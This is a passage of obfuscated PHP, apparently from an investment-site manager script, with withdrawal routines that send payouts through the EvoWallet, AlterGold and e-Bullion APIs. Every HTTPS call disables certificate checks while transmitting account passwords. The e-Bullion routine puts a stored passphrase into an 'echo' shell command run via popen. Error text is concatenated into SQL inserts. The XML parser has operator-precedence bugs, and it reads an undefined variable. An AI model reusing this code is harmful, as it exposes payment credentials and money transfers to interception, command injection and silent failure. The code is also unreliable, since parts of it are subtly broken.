      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcNiWo = elnlcvkdd ($a);
      if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcffPD'])
      {
        return array (1, '', $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']]);
      }
      else
      {
        if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcgCmxF'])
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcNiWo[$elnlcEuoJk['elnlczwcF']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcaaess ($elnlcwOTW)
  {
    global $elnlcEuoJk;
    $elnlcNiWo = array ();
    $elnlczaxd = elnlcutfb ($elnlcwOTW, 'response');
    if ($elnlczaxd != '')
    {
      $elnlcPgsH = $elnlczaxd;
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = elnlcutfb ($elnlcPgsH, 'status');
      $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = elnlcutfb ($elnlclgVF, 'statusmsg');
      $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']] = elnlcutfb ($elnlcPgsH, 'batch');
      $elnlcNiWo[$elnlcEuoJk['elnlciheCL']] = elnlcutfb ($elnlcPgsH, 'fromaccount');
      $elnlcNiWo[$elnlcEuoJk['elnlcAMrP']] = elnlcutfb ($elnlcPgsH, 'toaccount');
      $elnlcNiWo[$elnlcEuoJk['elnlcMOxFJ']] = elnlcutfb ($elnlcPgsH, 'amount');
      $elnlcNiWo[$elnlcEuoJk['elnlcWkrr']] = elnlcutfb ($elnlcPgsH, 'currency');
      $elnlcNiWo[$elnlcEuoJk['elnlcEFdo']] = elnlcutfb ($elnlcPgsH, 'checksum');
      if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == 0)
      {
        $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcOBEJR'];
      }
    }

    if (0 < $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']])
    {
      switch ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']])
      {
        case 10310:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10310: Invalid Account Prefix';
          break;
        }

        case 10311:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10311: Payer account has been suspended';
          break;
        }

        case 10312:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10312: API transfer disabled';
          break;
        }

        case 10313:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10313: Payee account not found';
          break;
        }

        case 10314:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10314: Payer spending over daily limit';
          break;
        }

        case 10315:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10315: Payee account has been suspended';
          break;
        }

        case 10316:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10316: Payee account has been limited';
          break;
        }

        case 10317:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10317: Spending less than minimum allowed';
          break;
        }

        case 10318:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10318: Payee will reach their balance limit';
          break;
        }

        case 10319:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10319: Payer do not have enough funds';
          break;
        }

        case 10320:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10320: Payee has an invalid balance security check';
          break;
        }

        case 10321:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10321: Spend was not complete';
          break;
        }

        case 10322:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10322: Payee account group not found';
          break;
        }

        case 10323:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10323: Invalid payee account';
          break;
        }

        case 10324:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10324: Invalid IP range';
          break;
        }

        case 10325:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10325: Invalid API or not enabled';
          break;
        }

        case 10326:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10326: Payer account group not found';
          break;
        }

        case 10327:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10327: Invalid payer account';
          break;
        }

        case 10328:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10328: Invalid checksum';
          break;
        }

        case 10110:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10110: Invalid Account Prefix';
          break;
        }

        case 10111:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10111: Account has been suspended';
          break;
        }

        case 10112:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10112: Invalid API or API not enabled';
          break;
        }

        case 10113:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10113: API balance query disabled';
          break;
        }

        case 10114:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10114: IP not in the allowed range';
          break;
        }

        case 10115:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10115: Balance can not be retrieved';
          break;
        }

        case 10116:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10116: Reserve';
          break;
        }

        case 10117:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10117: Account group not found';
          break;
        }

        case 10118:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10118: This account can not be found';
          break;
        }

        case 10119:
        {
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = '10119: Invalid Checksum';
          break;
        }
      }

      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcVufnu'];
    }

    return $elnlcNiWo;
  }

  function elnlcccbn ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl, $elnlcKApRg = 'USD')
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty EvoWallet account.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoWallet account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 24);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evowallet_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlchdof = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }

        $elnlcywzTq = $elnlcJutIa[$elnlcEuoJk['elnlchnjE']];
      }
      else
      {
        list ($elnlchdof, $elnlcywzTq) = preg_split ('/\\|/', $elnlcOhRB);
      }

      $elnlcJkNgH = curl_init ();
      $elnlcQKFy = date ($elnlcEuoJk['elnlcEBjT']);
      $elnlcQmbh = strtoupper (md5 ($elnlcywzTq . $elnlcQKFy . '103' . '' . $elnlcKApRg . $elnlcJutIa[$elnlcEuoJk['elnlcHaanG']] . $elnlcDslPO . $elnlcdPCw . md5 ($elnlchdof)));
      $elnlcRDaq = '<?xml version="1.0" encoding="utf-8"?>
<request>
<apiname>' . htmlentities ($elnlcywzTq, ENT_NOQUOTES) . '</apiname>
<trandate>' . $elnlcQKFy . '</trandate>
<trantype>103</trantype>
<tranid></tranid>
<curcode>' . $elnlcKApRg . '</curcode>
<fromaccount>' . htmlentities ($elnlcJutIa[$elnlcEuoJk['elnlcHaanG']], ENT_NOQUOTES) . '</fromaccount>
<toaccount>' . htmlentities ($elnlcDslPO, ENT_NOQUOTES) . '</toaccount>
<amount>' . htmlentities ($elnlcdPCw, ENT_NOQUOTES) . '</amount>
<memo>' . htmlentities ($elnlcCQAl, ENT_NOQUOTES) . '</memo> 
<checksum>' . $elnlcQmbh . '</checksum> 
</request>';
      $elnlcJkNgH = curl_init ();
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://www.evowallet.com/api.php?req=' . urlencode ($elnlcRDaq));
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcNiWo = elnlcaaess ($a);
      if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcffPD'])
      {
        return array (1, '', $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']]);
      }
      else
      {
        if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcgCmxF'])
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] . '<br>' . $elnlcNiWo[$elnlcEuoJk['elnlcnQeB']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcxgagp ($elnlcNisFi, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlterGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlterGold account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 17);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcNisFi == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'altergold_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcLtkjd = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        $elnlcLtkjd = $elnlcNisFi;
      }

      $elnlcJkNgH = curl_init ();
      $elnlcCQAl = rawurlencode ($elnlcCQAl);
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://api.altergold.com/spend.php');
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, 'PAYER_ACCOUNT=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcrmIN']]) . '&PAYER_PASSWORD=' . rawurlencode ($elnlcLtkjd) . '&PAYEE_ACCOUNT=' . rawurlencode ($elnlcDslPO) . '&PAYMENT_AMOUNT=' . rawurlencode ($elnlcdPCw) . ('' . '&PAYMENT_CURRENCY=USD&MEMO=' . $elnlcCQAl));
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      if ($a == '')
      {
        print 'Blank response from Altergold processor service.';
      }
      else
      {
        $elnlcQtRs = array ('E10011' => 'Unable to Login as Payer. This means wrong login information was provided.', 'E10012' => 'Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.', 'E10013' => 'API Automated Spends not Enabled.', 'E10014' => 'Unable to authorize IP address.', 'E10015' => 'Recipient account not found', 'E10016' => 'Recipient account is suspended.', 'E10017' => 'Invalid spend units.', 'E10018' => 'Spend amount is too low.', 'E10019' => 'Recipient reached balance limit.', 'E10020' => 'Not enough funds.', 'E10021' => '* Please contact support.');
        if ($elnlcQtRs[$a] != '')
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcQtRs[$a]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ('' . ' ' . $elnlcQtRs[$a]), '');
        }
        else
        {
          return array (1, '', $a);
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcueoei ($elnlcxUnz, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl, $elnlcDmtV)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to e-Bullion account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid e-Bullion account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 5);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      $elnlcKEpN = '<atip.batch.v1><payment.list>';
      $elnlcKEpN = $elnlcKEpN . '<payment>';
      $elnlcKEpN = $elnlcKEpN . '<payer>' . htmlentities ($elnlcJutIa[$elnlcEuoJk['elnlcJEVGv']], ENT_NOQUOTES) . '</payer>';
      $elnlcKEpN = $elnlcKEpN . '<payee>' . htmlentities ($elnlcDslPO, ENT_NOQUOTES) . '</payee>';
      $elnlcKEpN = $elnlcKEpN . '<amount>' . htmlentities ($elnlcdPCw, ENT_NOQUOTES) . '</amount>';
      $elnlcKEpN = $elnlcKEpN . '<metal>' . ($elnlcDmtV == 5 ? 1 : 3) . '</metal>';
      $elnlcKEpN = $elnlcKEpN . '<unit>1</unit>';
      $elnlcKEpN = $elnlcKEpN . '<memo>' . htmlentities ($elnlcCQAl, ENT_NOQUOTES) . '</memo>';
      $elnlcKEpN = $elnlcKEpN . '<ref></ref>';
      $elnlcKEpN = $elnlcKEpN . '</payment>';
      $elnlcKEpN = $elnlcKEpN . '</payment.list></atip.batch.v1>';
      $elnlcKivi = tempnam ('./tmpl_c/', 'in.');
      $elnlcETspb = tempnam ('./tmpl_c/', 'out.');
      $elnlcwWqJu = fopen ($elnlcKivi, $elnlcEuoJk['elnlcQFiog']);
      fwrite ($elnlcwWqJu, $elnlcKEpN);
      fclose ($elnlcwWqJu);
      $elnlcTKfc = './tmpl_c/';
      $elnlcnbCg = escapeshellcmd ($elnlcJutIa[$elnlcEuoJk['elnlcrcLpV']]);
      $elnlcDPqL = elnlcefsf ($elnlcJutIa[$elnlcEuoJk['elnlcBcUUV']], $elnlcEuoJk['elnlcdmCFO']);
      $elnlcmkSw = $elnlcJutIa[$elnlcEuoJk['elnlcnnTqn']];
      $elnlcLfeRB = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcTKfc . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0';
      $elnlcuikQW = '' . 'echo \'' . $elnlcDPqL . '\' | ' . $elnlcnbCg . ' ' . $elnlcLfeRB . ' --recipient A20077\\@e-bullion.com --local-user ' . $elnlcJutIa[$elnlcEuoJk['elnlcJEVGv']] . ('' . '\\@e-bullion.com --output ' . $elnlcETspb . ' --sign --encrypt ' . $elnlcKivi . ' 2>&1');
      $elnlcxObM = '';
      $elnlcDHasI = popen ('' . $elnlcuikQW, 'r');
      while (!feof ($elnlcDHasI))
      {
        $elnlcxObM = fgets ($elnlcDHasI, 4096);
      }

      pclose ($elnlcDHasI);
      $elnlcwWqJu = fopen ($elnlcETspb, $elnlcEuoJk['elnlcgLqW']);
      $elnlcVCqoc = fread ($elnlcwWqJu, filesize ($elnlcETspb));
      fclose ($elnlcwWqJu);
      unlink ($elnlcKivi);
      unlink ($elnlcETspb);
      $elnlcWbQz = 'ATIP_ACCOUNT=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcJEVGv']]) . '&ATIP_BATCH_MSG=' . rawurlencode ($elnlcVCqoc) . '&ATIP_STATUS_URL=' . rawurlencode ($elnlcmkSw);
      $elnlcJkNgH = curl_init ();
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, '' . 'https://atip.e-bullion.com/batch.php?' . $elnlcWbQz);
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcJkNgH, CURLOPT_HEADER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcdtiI = array ();
      $elnlcFcfaK = '';
      if (preg_match ('/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/', $a, $elnlcdtiI))
      {
        $elnlcFcfaK = $elnlcdtiI[1];
      }

      $elnlcFcfaK = urldecode ($elnlcFcfaK);
      $elnlczFjG = tempnam ('./tmpl_c/', 'xml.cert.');
      $elnlcvhIu = tempnam ('./tmpl_c/', 'xml.tmp.');
      $elnlcwWqJu = fopen ('' . $elnlcvhIu, $elnlcEuoJk['elnlcQFiog']);
      fwrite ($elnlcwWqJu, $elnlcFcfaK);
      fclose ($elnlcwWqJu);
      $elnlcLfeRB = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcTKfc . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0';
      $elnlcuikQW = '' . 'echo \'' . $elnlcDPqL . '\' | ' . $elnlcnbCg . ' ' . $elnlcLfeRB . ' --output ' . $elnlczFjG . ' --decrypt ' . $elnlcvhIu . ' 2>&1';
      $elnlcxObM = '';
      $elnlcsSIv = '';
      $elnlcDHasI = popen ('' . $elnlcuikQW, 'r');
      while (!feof ($elnlcDHasI))
      {
        $elnlcxObM = fgets ($elnlcDHasI, 4096);
        $elnlcGEVa = strstr ($elnlcxObM, 'key ID');
        if (0 < strlen ($elnlcGEVa))
        {
          $elnlcsSIv = preg_replace ('/[\\n\\r]/', '', substr ($elnlcGEVa, 7));
          continue;
        }
      }

      pclose ($elnlcDHasI);
      if ($elnlcsSIv == $elnlcJutIa[$elnlcEuoJk['elnlczsOQ']])
      {
        if (is_file ('' . $elnlczFjG))
        {
          $elnlcgkkR = fopen ('' . $elnlczFjG, $elnlcEuoJk['elnlcgLqW']);
          $elnlcwOTW = fread ($elnlcgkkR, filesize ('' . $elnlczFjG));
          fclose ($elnlcgkkR);
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Can not found decrypted verification response!');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ' Can not found decrypted verification response!', '');
        }

        $elnlcRDaq = elnlcsbtn ($elnlcwOTW);
        if ($elnlcRDaq[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcffPD'])
        {
          return array (1, '', $elnlcRDaq[$elnlcEuoJk['elnlcGPoCs']]);
        }
        else
        {
          if ($elnlcRDaq[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcgCmxF'])
          {
            $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcRDaq[$elnlcEuoJk['elnlczwcF']] . ' ' . $elnlcRDaq[$elnlcEuoJk['elnlcnQeB']]);
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcgPrNl . $elnlcRDaq[$elnlcEuoJk['elnlczwcF']] . ' ' . $elnlcRDaq[$elnlcEuoJk['elnlcnQeB']]);
          }
          else
          {
            $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Unknown error');
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcgPrNl . ' Unknown error', '');
          }
        }
      }
      else
      {
        $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Can not decrypt verification response! ');
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcgPrNl . ' Can not decrypt verification response!', '');
      }

      unlink ($elnlcvhIu);
      unlink ($elnlczFjG);
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available', '');
    }

  }

  function elnlcutfb ($elnlcRDaq, $elnlcTegBJ)
  {
    global $elnlcEuoJk;
    $elnlcTegBJ = strtolower ($elnlcTegBJ);
    $elnlcoInNj = strlen ($elnlcTegBJ) + 2;
    if ($elnlcnhDv = strpos ($elnlcRDaq, '' . '<' . $elnlcTegBJ . '>') === false)
    {
      return '';
    }

    if ($elnlcddwC = strpos ($elnlcRDaq, '' . '</' . $elnlcTegBJ . '>') === false)
    {
      return '';
    }

    $elnlctlFRC = trim (substr ($elnlcRDaq, $elnlcnhDv + $elnlcoInNj, $elnlcddwC - ($elnlcnhDv + $elnlcoInNj)));
    return $elnlctlFRC;
  }

  function elnlcsbtn ($elnlcwOTW)
  {
    global $elnlcEuoJk;
    $elnlcNiWo = array ();
    $elnlcJjnjz = elnlcutfb ($elnlcwOTW, 'balanceresponse.list');
    if ($elnlcJjnjz != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcDtUE'];
      $elnlcEEPim = false;
      if ($elnlcyTICm = stristr ($elnlcJjnjz, '<balance>') === false)
      {
        $elnlcEEPim = true;
      }
      else
      {
        $elnlcnhDv = strlen ($elnlcJjnjz) - strlen ($elnlcyTICm);
      }

      if ($elnlchSBEG = stristr ($elnlcJjnjz, '</balance>') === false)
      {
        $elnlcEEPim = true;
      }
      else
      {
        $elnlcddwC = strlen ($elnlcJjnjz) - strlen ($elnlchSBEG);
      }

      while (!$elnlcEEPim)
      {
        $elnlcjxTt = trim (substr ($elnlcJjnjz, $elnlcnhDv + 9, $elnlcddwC - 9));
        $elnlcJjnjz = trim (substr ($elnlcJjnjz, $elnlcddwC + 10));
        $elnlcNiWo[$elnlcEuoJk['elnlcMOxFJ']] = elnlcutfb ($elnlcjxTt, 'amount');
        if ($elnlcyTICm = stristr ($elnlcJjnjz, '<balance>') === false)
        {
          $elnlcEEPim = true;
        }
        else
        {
          $elnlcnhDv = strlen ($elnlcJjnjz) - strlen ($elnlcyTICm);
        }

        if ($elnlchSBEG = stristr ($elnlcJjnjz, '</balance>') === false)
        {
          $elnlcEEPim = true;
          continue;
        }
        else
        {
          $elnlcddwC = strlen ($elnlcJjnjz) - strlen ($elnlchSBEG);
          continue;
        }
      }
    }

    $elnlczaxd = elnlcutfb ($elnlcwOTW, 'verified.list');
    if ($elnlczaxd != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcOBEJR'];
      $elnlcEEPim = false;
      if ($elnlcyTICm = stristr ($elnlczaxd, '<transaction>') === false)
      {
        $elnlcEEPim = true;
      }
      else
      {
        $elnlcnhDv = strlen ($elnlczaxd) - strlen ($elnlcyTICm);
      }

      if ($elnlchSBEG = stristr ($elnlczaxd, '</transaction>') === false)
      {
        $elnlcEEPim = true;
      }
      else
      {
        $elnlcddwC = strlen ($elnlczaxd) - strlen ($elnlchSBEG);
      }

      while (!$elnlcEEPim)
      {
        $elnlcPgsH = trim (substr ($elnlczaxd, $elnlcnhDv + 13, $elnlcddwC - 13));
        $elnlczaxd = trim (substr ($elnlczaxd, $elnlcddwC + 14));
        $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']] = elnlcutfb ($elnlcPgsH, 'id');
        $elnlcNiWo[$elnlcEuoJk['elnlcAMrP']] = elnlcutfb ($elnlcPgsH, 'payee');
        $elnlcNiWo[$elnlcEuoJk['elnlciheCL']] = elnlcutfb ($elnlcPgsH, 'payer');
        $elnlcNiWo[$elnlcEuoJk['elnlcMOxFJ']] = elnlcutfb ($elnlcPgsH, 'amount');
        $elnlcNiWo[$elnlcEuoJk['elnlciThax']] = elnlcutfb ($elnlcPgsH, 'metal');
        $elnlcNiWo[$elnlcEuoJk['elnlcPaCL']] = elnlcutfb ($elnlcPgsH, 'unit');
        $elnlcNiWo[$elnlcEuoJk['elnlcEOWon']] = elnlcutfb ($elnlcPgsH, 'memo');
        $elnlcNiWo[$elnlcEuoJk['elnlcwHAAI']] = elnlcutfb ($elnlcPgsH, 'exchange');
        $elnlcNiWo[$elnlcEuoJk['elnlcstvTo']] = elnlcutfb ($elnlcPgsH, 'fee');
        if ($elnlcyTICm = stristr ($elnlczaxd, '<transaction>') === false)
        {
          $elnlcEEPim = true;
        }
        else
        {
          $elnlcnhDv = strlen ($elnlczaxd) - strlen ($elnlcyTICm);
        }

        if ($elnlchSBEG = stristr ($elnlczaxd, '</transaction>') === false)
        {
          $elnlcEEPim = true;
          continue;
        }
        else
        {
          $elnlcddwC = strlen ($elnlczaxd) - strlen ($elnlchSBEG);
          continue;
        }
      }
    }

    $elnlcWvpR = elnlcutfb ($elnlcwOTW, 'failed.list');
    if ($elnlcWvpR != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcVufnu'];
      $elnlcEEPim = false;
      if ($elnlcyTICm = stristr ($elnlcWvpR, '<failed>') === false)
      {
        $elnlcEEPim = true;
      }
      else
      {
        $elnlcnhDv = strlen ($elnlcWvpR) - strlen ($elnlcyTICm);
      }

      if ($elnlchSBEG = stristr ($elnlcWvpR, '</failed>') === false)
      {
        $elnlcEEPim = true;
      }
      else
      {
        $elnlcddwC = strlen ($elnlcWvpR) - strlen ($elnlchSBEG);
      }

      while (!$elnlcEEPim)
      {
        $elnlczGQVs = trim (substr ($elnlcWvpR, $elnlcnhDv + 13, $elnlcddwC - 13));
        $elnlcWvpR = trim (substr ($elnlcWvpR, $elnlcddwC + 14));
        $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = elnlcutfb ($elnlczGQVs, 'error');
        if ($elnlcyTICm = stristr ($elnlcWvpR, '<failed>') === false)
        {
          $elnlcEEPim = true;
        }
        else
        {
          $elnlcnhDv = strlen ($elnlcWvpR) - strlen ($elnlcyTICm);
        }

        if ($elnlchSBEG = stristr ($elnlcWvpR, '</failed>') === false)
        {
          $elnlcEEPim = true;
          continue;
        }
        else
        {
          $elnlcddwC = strlen ($elnlcWvpR) - strlen ($elnlchSBEG);
          continue;
        }
      }
    }

    $elnlcgbgtz = elnlcutfb ($elnlcwOTW, 'errorresponse.list');
    if ($elnlcgbgtz != '')
